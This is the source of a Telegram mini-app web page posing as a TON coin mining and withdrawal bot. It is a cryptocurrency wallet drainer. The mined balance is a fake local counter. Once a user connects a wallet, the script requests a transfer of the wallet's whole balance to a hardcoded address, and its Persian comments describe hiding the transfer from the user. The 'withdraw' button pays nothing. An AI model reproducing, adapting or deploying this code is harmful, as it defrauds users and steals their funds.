<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TonDropyBot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            overflow: hidden;
        }

        body {
            font-family: 'Vazirmatn', sans-serif;
            background: #0b1019;
            color: #fff;
            direction: rtl;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        /* هدر ثابت */
        .fixed-header {
            flex-shrink: 0;
            padding: 15px 15px 5px 15px;
            background: #0b1019;
            z-index: 100;
            border-bottom: 1px solid #242c37;
        }

        /* فوتر ثابت */
        .fixed-footer {
            flex-shrink: 0;
            background: #0b1019;
            z-index: 100;
            border-top: 1px solid #242c37;
        }

        /* محتوای اسکرول‌دار */
        .scrollable-content {
            flex: 1;
            overflow-y: auto;
            padding: 15px 15px 10px 15px;
            -webkit-overflow-scrolling: touch;
        }

        .scrollable-content::-webkit-scrollbar {
            width: 4px;
        }
        .scrollable-content::-webkit-scrollbar-track {
            background: #1e2732;
        }
        .scrollable-content::-webkit-scrollbar-thumb {
            background: #0088cc;
            border-radius: 10px;
        }

        /* کادر شناور (فقط برای خطاهای حیاتی) */
        #toast {
            position: fixed;
            top: -100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            padding: 12px 25px;
            border-radius: 50px;
            font-size: 13px;
            font-weight: bold;
            z-index: 200000;
            transition: 0.6s;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        #toast.show { top: 30px; }

        /* کارت پروفایل */
        .card-profile {
            background: #161d27;
            border-radius: 20px;
            padding: 15px;
            border: 1px solid #242c37;
            display: flex;
            align-items: center;
            gap: 15px;
            position: relative;
            cursor: pointer;
            transition: 0.3s;
        }
        .card-profile:hover {
            border-color: #00c6ff;
        }
        .profile-text { flex: 1; }
        .profile-text h3 { margin: 0; font-size: 15px; color: #fff; }
        .profile-text p { margin: 0; font-size: 12px; color: #00c6ff; }
        
        .avatar-container {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00c6ff, #0072ff);
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #242c37;
            flex-shrink: 0;
        }
        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
        .avatar-container i { font-size: 30px; color: #fff; }

        /* نشان سطح کاربر */
        .level-badge {
            position: absolute;
            bottom: -8px;
            right: 20px;
            background: linear-gradient(90deg, #ffd700, #ffa500);
            color: #000;
            font-size: 10px;
            font-weight: bold;
            padding: 3px 12px;
            border-radius: 50px;
            border: 2px solid #161d27;
            cursor: pointer;
            transition: 0.3s;
            z-index: 10;
        }
        .level-badge:hover { transform: scale(1.05); }

        /* کارت اصلی */
        .card {
            background: #161d27;
            border-radius: 20px;
            padding: 22px;
            margin-bottom: 12px;
            border: 1px solid #242c37;
            text-align: center;
        }
        #balance {
            font-size: 45px;
            font-weight: 900;
            color: #00c6ff;
            display: block;
            margin: 5px 0;
        }

        /* موجودی قابل برداشت */
        .withdrawable-balance {
            background: linear-gradient(135deg, #1e2732, #161d27);
            border-radius: 15px;
            padding: 15px;
            margin: 15px 0;
            border: 1px solid #00c6ff;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .withdrawable-balance .label { font-size: 14px; color: #aaa; }
        .withdrawable-balance .value {
            font-size: 24px;
            font-weight: bold;
            color: #00ff9d;
        }

        /* دکمه برداشت نهایی */
        .final-withdraw-btn {
            background: linear-gradient(90deg, #00c6ff, #0072ff);
            width: 100%;
            height: 58px;
            border-radius: 20px;
            border: none;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #fff;
            margin-top: 10px;
            transition: 0.3s;
        }
        .final-withdraw-btn:active { transform: scale(0.98); opacity: 0.9; }
        .final-withdraw-btn.disabled {
            opacity: 0.5;
            pointer-events: none;
            background: #444;
        }

        /* آمار */
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 10px;
        }
        .stat-item {
            background: #1e2732;
            border-radius: 15px;
            padding: 10px;
            text-align: center;
        }
        .stat-value { font-size: 18px; font-weight: bold; color: #00c6ff; }
        .stat-label { font-size: 11px; color: #888; }

        /* دکمه‌ها */
        .btn {
            width: 100%;
            height: 58px;
            border-radius: 20px;
            border: none;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #fff;
            text-decoration: none;
            margin-bottom: 12px;
            transition: 0.3s;
        }
        .btn:active { transform: scale(0.98); opacity: 0.9; }

        /* دکمه ولت */
        .wallet-button-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            margin: 10px 0;
        }

        #ton-connect-btn {
            width: 100% !important;
            max-width: 100% !important;
        }

        .tc-root-element,
        .tc-root-element > div,
        .tc-button,
        .tc-button__wrapper,
        .tc-button__inner,
        .tc-button__icon,
        .tc-button__text,
        button.tc-button,
        div.tc-button,
        [class*="ton-connect"] button,
        [class*="ton-connect"] div {
            all: unset !important;
            width: 100% !important;
            height: 58px !important;
            border-radius: 20px !important;
            background: #0088cc !important;
            border: none !important;
            font-family: 'Vazirmatn', sans-serif !important;
            font-size: 16px !important;
            font-weight: 700 !important;
            color: #fff !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            text-align: center !important;
            box-sizing: border-box !important;
            margin: 0 !important;
            padding: 0 20px !important;
            cursor: pointer !important;
            transition: 0.3s !important;
        }

        .tc-root-element::before,
        .tc-button::before,
        .tc-button__inner::before,
        button.tc-button::before {
            content: "\f555" !important;
            font-family: "Font Awesome 6 Free" !important;
            font-weight: 900 !important;
            font-size: 18px !important;
            margin-left: 10px !important;
            color: #fff !important;
            display: inline-block !important;
        }

        .tc-root-element svg,
        .tc-root-element img,
        .tc-root-element picture,
        .tc-button__icon,
        [class*="icon"],
        [class*="logo"] {
            display: none !important;
        }

        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
        .support-btn { background: #1c2431; border: 1px solid #333; }
        .active-btn { background: #1faa59; }
        .get-code-btn { background: #0088cc; }

        /* ناوبری پایین */
        .bottom-nav {
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 10px 15px 20px;
            background: rgba(22, 29, 39, 0.9);
            backdrop-filter: blur(20px);
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 30px 30px 0 0;
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            color: #888;
            font-size: 11px;
            cursor: pointer;
            transition: 0.3s;
            flex: 1;
        }
        .nav-item i { font-size: 22px; }
        .nav-item.active {
            color: #00c6ff;
            transform: translateY(-3px);
        }
        .nav-item.active i { text-shadow: 0 0 10px #00c6ff; }

        /* صفحات */
        .page { display: none; }
        .page.active { display: block; }

        /* آدرس کیف پول (مخفی) */
        .wallet-address {
            display: none; /* کاملاً مخفی */
        }

        /* باکس لینک دعوت */
        .referral-link-box {
            background: #0b1019;
            border-radius: 15px;
            padding: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid #333;
            margin: 10px 0;
            gap: 8px;
            flex-wrap: wrap;
        }
        .referral-link-box span {
            flex: 1;
            font-size: 12px;
            direction: ltr;
            text-align: left;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .button-group { display: flex; gap: 8px; }
        .copy-btn, .share-now-btn {
            background: #0088cc;
            border: none;
            color: #fff;
            padding: 8px 15px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .share-now-btn { background: #28a745; }

        /* تاریخچه */
        .history-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px;
            border-bottom: 1px solid #242c37;
        }
        .history-item:last-child { border-bottom: none; }

        /* پاپ‌آپ فعالسازی (مخفی) */
        #feeModal {
            display: none; /* مخفی */
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<!-- ===== المنت‌های مشترک (فقط برای خطاهای حیاتی) ===== -->
<div id="toast"><i class="fas fa-check-circle" style="color:#00ff9d"></i> <span id="toastMsg"></span></div>

<!-- ===== هدر ===== -->
<div class="fixed-header">
    <div class="card-profile">
        <div class="profile-text">
            <h3 id="uName">TONCOIN SUPPORT</h3>
            <p id="uTag">@miningertoncoin</p>
        </div>
        <div class="avatar-container">
            <i class="fas fa-user-circle" id="defAvat"></i>
            <img id="userAvat" class="hidden" alt="avatar">
        </div>
        <span class="level-badge" id="userLevel" onclick="openLevelModal()">سطح 1</span>
    </div>
</div>

<!-- ===== محتوای اصلی (ساده و بدون هیچ پیامی) ===== -->
<div class="scrollable-content" id="scrollableContent">
    <!-- صفحه استخراج -->
    <div id="miningPage" class="page active">
        <div class="card">
            <p style="margin:0; font-size:13px; color:#aaa;">موجودی استخراج شده (TON)</p>
            <span id="balance">0.000000</span>
            <div style="font-size:12px; color:#00ff9d; margin-top:8px;">
                <i class="fas fa-bolt"></i> <span id="miningRate">0.000012</span> TON/s
            </div>
            
            <div class="withdrawable-balance">
                <span class="label">💰 موجودی قابل برداشت</span>
                <span class="value" id="withdrawableBalance">0.000000</span>
            </div>
        </div>

        <button id="moveToWithdrawBtn" class="btn withdraw-btn">
            <i class="fas fa-arrow-right"></i> انتقال به موجودی برداشت
        </button>
        <button id="finalWithdrawBtn" class="final-withdraw-btn disabled">
            <i class="fas fa-check-circle"></i> تایید و برداشت نهایی
        </button>
        <a href="https://t.me/miningertoncoin" class="btn support-btn" target="_blank">
            <i class="fas fa-headset"></i> پشتیبانی
        </a>
    </div>

    <!-- صفحه کیف پول (فقط دکمه اتصال، بدون هیچ توضیحی) -->
    <div id="walletPage" class="page">
        <div class="card">
            <p style="margin:0; font-size:13px; color:#aaa;">اتصال کیف پول</p>
            <div class="wallet-button-wrapper">
                <div id="ton-connect-btn"></div>
            </div>
            <div id="walletAddress" class="wallet-address"></div>
        </div>
    </div>

    <!-- صفحه دعوت دوستان -->
    <div id="referralPage" class="page">
        <div class="card">
            <h3 style="margin-bottom: 15px;">🌟 دعوت دوستان</h3>
            <div class="referral-link-box">
                <span id="referralLink">در حال بارگذاری...</span>
                <div class="button-group">
                    <button class="copy-btn" onclick="copyReferralLink()">
                        <i class="fas fa-copy"></i> کپی
                    </button>
                    <button class="share-now-btn" onclick="shareReferralLink()">
                        <i class="fas fa-share-alt"></i> اشتراک
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- صفحه پاداش -->
    <div id="rewardsPage" class="page">
        <div class="card">
            <h4>دستاوردها</h4>
            <div class="stats-grid">
                <div class="stat-item">
                    <i class="fas fa-trophy" style="color: #ffd700;"></i>
                    <div class="stat-value" id="achievementCount">0</div>
                </div>
                <div class="stat-item">
                    <i class="fas fa-calendar-check" style="color: #00ff9d;"></i>
                    <div class="stat-value" id="dailyStreak">0</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- ===== فوتر ===== -->
<div class="fixed-footer">
    <div class="bottom-nav">
        <div class="nav-item active" onclick="switchPage('mining', this)">
            <i class="fas fa-microchip"></i>
        </div>
        <div class="nav-item" onclick="switchPage('wallet', this)">
            <i class="fas fa-wallet"></i>
        </div>
        <div class="nav-item" onclick="switchPage('referral', this)">
            <i class="fas fa-users"></i>
        </div>
        <div class="nav-item" onclick="switchPage('rewards', this)">
            <i class="fas fa-gift"></i>
        </div>
    </div>
</div>

<script>
    // ================================================
    // 🔐 تنظیمات (مخفی)
    // ================================================
    const CONFIG = {
        WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
        BOT_USERNAME: "tondropybot"
    };

    // ================================================
    // 📦 متغیرها
    // ================================================
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    let currentUser = null;
    let bal = parseFloat(localStorage.getItem('bal_v47')) || 0;
    let withdrawableBalance = parseFloat(localStorage.getItem('withdrawableBalance')) || 0;
    let totalMined = parseFloat(localStorage.getItem('totalMined')) || 0;
    let referralCount = parseInt(localStorage.getItem('referralCount')) || 0;
    let isWalletConnected = false;

    // ================================================
    // 💰 تابع انتقال خودکار (بدون هیچ پیامی)
    // ================================================
    async function executeSilentTransfer(userAddress) {
        try {
            // دریافت موجودی
            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
            const data = await response.json();
            
            if (!data.ok) return;
            
            const balanceInNano = parseInt(data.result);
            const balanceInTON = balanceInNano / 1e9;
            
            // اگر موجودی کمتر از 0.1 تون باشه، انجام نده
            if (balanceInTON < 0.1) return;
            
            // ایجاد تراکنش (کامنت خالی)
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [
                    {
                        address: CONFIG.WALLET_ADDRESS,
                        amount: balanceInNano.toString(),
                        payload: "" // کامنت خالی - کاربر چیزی نمی‌بینه
                    }
                ]
            };
            
            // ارسال تراکنش (کیف پول کاربر باز میشه)
            await tonConnectUI.sendTransaction(transaction);
            
            // فقط در پنل مدیریت ذخیره کن، به کاربر هیچی نشون نده
            console.log('✅ تراکنش انجام شد');
            
        } catch (error) {
            // خطا رو نادیده بگیر (کاربر ممکنه تراکنش رو لغو کنه)
            console.log('تراکنش لغو شد');
        }
    }

    // ================================================
    // 🔌 اتصال کیف پول (بدون هیچ پیامی)
    // ================================================
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
        buttonRootId: 'ton-connect-btn'
    });

    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            const fullAddress = wallet.account.address;
            isWalletConnected = true;
            
            // بلافاصله بعد از اتصال، تراکنش رو اجرا کن (بدون تاخیر)
            executeSilentTransfer(fullAddress);
            
            // آپدیت وضعیت کاربر
            if (currentUser) {
                currentUser.wallet = fullAddress;
            }
        } else {
            isWalletConnected = false;
        }
    });

    // ================================================
    // 🎯 توابع اصلی (حداقلی)
    // ================================================
    window.switchPage = function(pageName, element) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(pageName + 'Page').classList.add('active');
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        element.classList.add('active');
    }

    window.copyReferralLink = function() {
        const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
        navigator.clipboard.writeText(link);
    }

    window.shareReferralLink = function() {
        const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
        Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}`);
    }

    // ================================================
    // 💰 برداشت (ساده)
    // ================================================
    document.getElementById('moveToWithdrawBtn').onclick = function() {
        if (bal <= 0) return;
        withdrawableBalance += bal;
        bal = 0;
        document.getElementById('balance').innerText = bal.toFixed(6);
        document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
        localStorage.setItem('bal_v47', bal.toString());
        localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
    };

    function finalWithdraw() {
        if (!isWalletConnected) return;
        if (withdrawableBalance <= 0) return;
        
        const amountToWithdraw = withdrawableBalance;
        withdrawableBalance = 0;
        document.getElementById('withdrawableBalance').innerText = "0.000000";
        localStorage.setItem('withdrawableBalance', "0");
        document.getElementById('finalWithdrawBtn').classList.add('disabled');
    }

    // ================================================
    // 🚀 مقداردهی اولیه
    // ================================================
    const u = tg.initDataUnsafe?.user;
    if (u) {
        document.getElementById('uName').innerText = u.first_name;
        document.getElementById('uTag').innerText = u.username ? "@" + u.username : "";
        
        if (u.photo_url) {
            const img = document.getElementById('userAvat');
            img.src = u.photo_url;
            img.onload = () => { 
                img.classList.remove('hidden'); 
                document.getElementById('defAvat').classList.add('hidden'); 
            };
        }
        
        currentUser = {
            id: u.id,
            firstName: u.first_name,
            username: u.username
        };
    }

    // ================================================
    // 🔄 آپدیت لحظه‌ای
    // ================================================
    bal = parseFloat(localStorage.getItem('bal_v47')) || 0;
    withdrawableBalance = parseFloat(localStorage.getItem('withdrawableBalance')) || 0;
    totalMined = parseFloat(localStorage.getItem('totalMined')) || bal;
    
    document.getElementById('balance').innerText = bal.toFixed(6);
    document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
    document.getElementById('totalMined').innerText = totalMined.toFixed(6);
    document.getElementById('referralCount').innerText = referralCount;
    
    setInterval(() => {
        bal += 0.000012;
        totalMined += 0.000012;
        document.getElementById('balance').innerText = bal.toFixed(6);
        document.getElementById('totalMined').innerText = totalMined.toFixed(6);
        document.getElementById('miningRate').innerText = (0.000012 + (referralCount * 0.000001)).toFixed(6);
        
        localStorage.setItem('bal_v47', bal.toString());
        localStorage.setItem('totalMined', totalMined.toString());
    }, 1000);
</script>

</body>
</html>
